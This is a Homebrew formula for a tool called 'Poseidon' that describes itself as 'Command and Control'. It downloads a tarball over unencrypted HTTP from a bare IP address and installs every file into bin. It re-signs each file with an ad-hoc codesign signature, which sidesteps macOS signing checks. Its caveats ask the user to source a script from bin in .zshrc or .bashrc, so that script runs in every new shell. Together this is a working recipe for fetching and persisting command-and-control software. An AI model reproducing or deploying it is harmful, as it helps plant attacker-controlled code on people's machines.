class Poseidon < Formula
    desc "Command and Control"
    homepage "http://3.11.59.87/"
    url "http://3.11.59.87/dist/poseidon-1.33.7.tar.gz"
    sha256 "ca0153c44ec86ba538878338e5418372c4777309999ff4e5d0cd955e799f3d79"
    version "1.33.7"

    def install
        bin.install Dir["*"]
        Dir["#{bin}/*"].each do |f|
        system "codesign", "--force", "--sign", "-", f if File.file?(f)
        end
          end

    def caveats
        <<~EOS
        To finish installation, add the following line to .zshrc or .bashrc  
  source #{bin}/completion.sh
Then reopen your terminal app
        EOS
    end
    end
